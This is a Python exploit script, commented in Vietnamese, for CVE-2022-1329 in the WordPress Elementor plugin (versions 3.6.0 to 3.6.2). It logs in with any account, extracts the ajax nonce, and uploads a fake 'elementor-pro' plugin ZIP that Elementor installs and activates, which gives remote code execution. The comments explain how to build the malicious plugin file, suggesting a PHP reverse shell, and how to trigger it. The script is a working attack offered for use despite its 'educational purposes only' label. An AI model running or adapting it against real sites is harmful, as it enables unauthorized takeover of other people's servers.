#!/usr/bin/python
import requests
import re

#CẢNH BÁO: Việc khai thác này KHÔNG bao gồm tải trọng.
# Ngoài ra, hãy chắc chắn rằng bạn đã có một số thông tin xác thực hợp lệ. Việc khai thác này cần có tài khoản để hoạt động.

# Khai thác Tiêu đề: Thực thi mã từ xa WP Elementor 3.6.0/1/2
# Google Dork: không có
# Ngày: 16/04/2022
# Khai thác Tác giả: Việt Hùng (https://github.com/phanthibichtam12)
# Trang chủ của nhà cung cấp: https://elementor.com/
#Link phần mềm: https://wordpress.org/plugins/elementor/advanced/ (kéo xuống chọn phiên bản)
# Phiên bản: 3.6.0, 3.6.1, 3.62
# Đã thử nghiệm trên: WordPress 5.9.3 (không phụ thuộc vào hệ điều hành vì việc khai thác này KHÔNG cung cấp tải trọng)
#CVE : CVE-2022-1329

# # # # # # # THỰC HIỆN MÃ TỪ XA # # # # # #
# Khai thác plugin WordPress sau: #
# Yếu tố 3.6.0/1/2 #
# Khai thác của Việt Hùng #
#CVE-2022-1329#
# # # # # # # # # # # # # # # # # # # # # # #
# Chỉ dành cho mục đích giáo dục #
# #
# #
# #
# # # # # # # # # # # # # # # # # # # # # # #

# # # # # MÔ TẢ LỖI LỖI LỖI # # # # #
# Plugin WordPress có tên Elementor (v. 3.6.0, 3.6.1, 3.6.2) có một lỗ hổng cho phép bất kỳ người dùng được xác thực nào tải lên và thực thi bất kỳ tệp PHP nào.
# Lỗ hổng này nằm trong OWASP TOP 10 2021 được đặt ở vị trí số 1 (Kiểm soát truy cập bị hỏng)
# Tệp chứa lỗ hổng này là elementor/core/app/modules/onboarding/module.php
#
# Ở cuối tập tin này, bạn có thể tìm thấy mã này:
#	add_action( 'admin_init', function() {
#			if ( wp_doing_ajax() &&
#				isset( $_POST['action'] ) &&
#				isset( $_POST['_nonce'] ) &&
#				wp_verify_nonce( $_POST['_nonce'], Ajax::NONCE_KEY )
#			) {
#				$this->maybe_handle_ajax();
#			}
#		} );
#
# Mã này được kích hoạt bất cứ khi nào BẤT KỲ tài khoản người dùng nào truy cập /wp-admin
# Để làm việc được chúng ta cần có 4 thứ sau:
# 1. Cuộc gọi phải là "cuộc gọi ajax" (wp_doing_ajax()) và phương thức phải là POST. Để thực hiện việc này, chúng ta chỉ cần gọi /wp-admin/admin-ajax.php
# 2. Tham số "action" phải là "elementor_upload_and_install_pro" (xem hàm có tên Maybe_handle_ajax() trong cùng một file)
# 3. Tham số "_nonce" phải được truy xuất sau khi đăng nhập bằng cách kiểm tra trang /wp-admin (lỗi khai thác này thực hiện điều này trong chức năng DoLogin)
# 4. Tham số "fileToUpload" phải chứa kho lưu trữ ZIP mà chúng tôi muốn tải lên (xem hàm có tên upload_and_install_pro() trong cùng một tệp)
#
# File chúng ta upload phải có cấu trúc như sau:
# 1. Nó phải là tệp ZIP. Bạn có thể đặt tên nó theo ý muốn.
# 2. Nó phải chứa một thư mục có tên "elementor-pro"
# 3. Thư mục này phải chứa file có tên "elementor-pro.php"
# Tệp này sẽ là tải trọng CỦA BẠN (ví dụ: PHP Reverse Shell hoặc bất kỳ thứ gì khác)
# 4. Tải trọng phải chứa ÍT NHẤT tên plugin, nếu không WordPress sẽ KHÔNG chấp nhận và quá trình tải lên sẽ THẤT BẠI
# <?php
# /**
# * Plugin Name: Elementor Pro
# */
#    // Actual PHP payload
# ?>
#
# CẢNH BÁO: Plugin giả mà chúng tôi tải lên sẽ được Elementor kích hoạt, điều này có nghĩa là mỗi lần chúng tôi truy cập bất kỳ trang nào, chúng tôi sẽ kích hoạt tải trọng của mình.
# Ví dụ: nếu nó cố gắng kết nối với máy chủ ngoại tuyến, điều đó có thể dẫn đến Từ chối Dịch vụ.
# Để ngăn chặn điều này, tôi khuyên bạn nên sử dụng một số biến để kích hoạt tải trọng.
# Đại loại như thế này (truy cập Anypage.php?activate=1 để tiếp tục với tải trọng thực tế):
# if (!isset($_GET['activate']))
#	return;

# thay đổi bốn biến sau:
payloadFileName = 'elementor-pro.zip'
baseUrl = 'http://192.168.56.103/wordpress/' 
username = 'guest'
password = 'test' 
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 

session = requests.Session()
cookies = { 'wordpress_test_cookie' : 'WP+Cookie+check' } # WordPress needs this to tell if browser can manage cookies

def DoLogin(username, password):
	global cookies
	loginUrl = baseUrl + 'wp-login.php'
	adminUrl = baseUrl + 'wp-admin/'
	data = { 'log' : username, 'pwd' : password, 'wp-submit' : 'Login', 'redirect_to' : adminUrl, 'testcookie' : 1 }
	

	regexp = re.compile('"ajax":\\{"url":".+admin\\-ajax\\.php","nonce":"(.+)"\\}') 
	response = session.post(loginUrl, cookies=cookies, data=data)

	search = regexp.search(response.text)

	if not search:
		
		print('Error - Invalid credentials?')
	
	else:
		return search.group(1)

def UploadFile(fileName, nonce):
	uploadUrl = baseUrl + 'wp-admin/admin-ajax.php'
	data = { 'action' : 'elementor_upload_and_install_pro', '_nonce' : nonce }
	files = { 'fileToUpload' : open(fileName, 'rb') }
	regexp = re.compile('"elementorProInstalled":true') 
	response = session.post(uploadUrl, data=data, files=files)

	search = regexp.search(response.text)

	if not search:
		print ('Error - Upload failed')
		return False
	else:
		print ('Upload completed successfully!')
		return True

# Xác định phương thức CỦA BẠN để kích hoạt tải trọng của bạn (nếu cần)
def ActivatePayload():
	payloadUrl = baseUrl + 'index.php?activate=1'
	session.get(payloadUrl)

	
print('Trying to login...')
nonce = DoLogin(username, password)
print('Nonce found: ' + nonce)

print('Uploading payload...')
fileUploaded = UploadFile(payloadFileName, nonce)

# Xác định phương thức CỦA BẠN để kích hoạt tải trọng của bạn (nếu cần)
if fileUploaded:
	print ('Activating payload...')
	ActivatePayload()
